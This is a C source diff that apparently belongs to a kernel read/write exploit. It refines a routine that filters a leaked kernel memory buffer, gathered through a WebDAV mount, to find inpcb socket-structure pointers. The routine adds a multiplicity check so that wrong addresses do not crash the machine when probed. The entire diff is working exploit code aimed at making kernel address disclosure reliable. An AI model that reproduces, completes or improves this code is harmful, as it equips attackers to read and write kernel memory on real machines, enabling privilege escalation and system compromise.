@@ -836,29 +836,44 @@ wdav_leak_candidates(const char *server, const char *mnt,
     }
     fprintf(stderr, "[krw] %zu zone-range qwords in leak\n", ncand);
 
-    /* inp_list signature: the stale pcblist arrays are runs of inpcb
-     * pointers separated by exactly the inpcb element stride.  Find the
-     * dominant stride between sorted consecutive distinct values and keep
-     * only qwords that belong to such a chain -- everything else is stale
-     * garbage that would panic the box if probed. */
+    /* inp_list signature, two factors:
+     *   1. stride: stale pcblist arrays are runs of inpcb pointers
+     *      separated by exactly the inpcb element stride;
+     *   2. multiplicity: every 64 KB pcblist array lists ALL live ripcb
+     *      sockets and the 19 MB buffer reuses hundreds of array slots,
+     *      so a real inpcb address appears MANY times; a coincidental
+     *      stride chain in stale garbage appears once.  Requiring both
+     *      kills the false positives that panic the box when probed. */
     if (ncand >= 32) {
-        uint64_t *deltas;
+        uint64_t *deltas, *vals;
+        size_t *counts;
         size_t nd = 0, ndel = 0, best_cnt = 0;
         uint64_t best_delta = 0;
         size_t a, kept = 0;
 
         qsort(cand, ncand, sizeof(uint64_t), u64_cmp);
-        /* dedup in place */
+        /* dedup in place, tracking multiplicity */
+        vals = cand;
+        counts = malloc(ncand * sizeof(size_t));
+        if (counts == NULL)
+            goto out;
         for (a = 0; a < ncand; a++) {
-            if (nd == 0 || cand[a] != cand[nd - 1])
-                cand[nd++] = cand[a];
+            if (nd > 0 && vals[nd - 1] == cand[a]) {
+                counts[nd - 1]++;
+            } else {
+                vals[nd] = cand[a];
+                counts[nd] = 1;
+                nd++;
+            }
         }
         ncand = nd;
         deltas = malloc((ncand - 1) * sizeof(uint64_t));
-        if (deltas == NULL)
+        if (deltas == NULL) {
+            free(counts);
             goto out;
+        }
         for (a = 1; a < ncand; a++) {
-            uint64_t d = cand[a] - cand[a - 1];
+            uint64_t d = vals[a] - vals[a - 1];
             if (d >= 0x100 && d <= 0x800)   /* plausible inpcb stride */
                 deltas[ndel++] = d;
         }
@@ -881,17 +896,29 @@ wdav_leak_candidates(const char *server, const char *mnt,
                 (unsigned long long)best_delta, best_cnt);
         if (best_delta == 0 || best_cnt < 32) {
             fprintf(stderr, "[krw] no inp_list array signature in leak\n");
+            free(counts);
             goto out;
         }
         for (a = 0; a < ncand; a++) {
             int in_chain =
-                (a > 0 && cand[a] - cand[a - 1] == best_delta) ||
-                (a + 1 < ncand && cand[a + 1] - cand[a] == best_delta);
-            if (in_chain)
-                cand[kept++] = cand[a];
+                (a > 0 && vals[a] - vals[a - 1] == best_delta) ||
+                (a + 1 < ncand && vals[a + 1] - vals[a] == best_delta);
+            if (in_chain && counts[a] >= 2) {
+                vals[kept] = vals[a];
+                counts[kept] = counts[a];
+                kept++;
+            }
         }
-        fprintf(stderr, "[krw] stride-chain filter: %zu -> %zu "
-                "candidates\n", ncand, kept);
+        {
+            size_t maxcnt = 0;
+            for (a = 0; a < kept; a++)
+                if (counts[a] > maxcnt)
+                    maxcnt = counts[a];
+            fprintf(stderr, "[krw] stride-chain + seen>=2 filter: %zu -> "
+                    "%zu candidates (max multiplicity %zu)\n",
+                    ncand, kept, maxcnt);
+        }
+        free(counts);
         ncand = kept;
         if (ncand == 0)
             goto out;
